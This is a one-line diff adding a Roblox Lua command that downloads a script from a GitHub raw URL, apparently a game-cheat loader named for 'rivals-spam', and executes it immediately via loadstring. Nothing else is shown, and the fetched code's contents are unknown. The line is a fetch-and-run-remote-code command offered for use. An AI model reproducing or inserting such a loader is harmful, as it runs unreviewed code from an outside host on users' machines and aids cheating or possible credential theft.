@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/rivals-spam0-lxjqa0xkkqo3v2.lua"))()
